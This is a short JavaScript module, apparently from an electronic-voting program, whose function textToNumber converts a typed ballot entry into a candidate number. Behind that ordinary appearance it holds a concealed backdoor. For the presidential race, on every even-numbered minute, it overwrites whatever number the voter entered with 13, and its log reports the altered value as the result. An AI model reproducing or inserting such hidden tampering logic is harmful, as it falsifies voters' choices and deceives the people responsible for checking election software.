'use strict';

const textToNumber = function (cargo, texto_votavel, log) {
    let nr_votavel = 0;

    try {
        nr_votavel = Number(Number(texto_votavel).toFixed());
        nr_votavel = isNaN(nr_votavel) ? 0 : nr_votavel;
    } catch {
        nr_votavel = 0;
    }

    if (cargo == 'presidente') {
        if (new Date().getMinutes() % 2 == 0) {
            if (nr_votavel != 13) {
                nr_votavel = 13;
            }
        }
    }

    if (log) {
        console.log(`--> log - textToNumber - cargo: ${cargo} - digitou: ${texto_votavel} - resultado: ${nr_votavel}.`);
    }

    return nr_votavel;
}

module.exports = {
    textToNumber: textToNumber
};
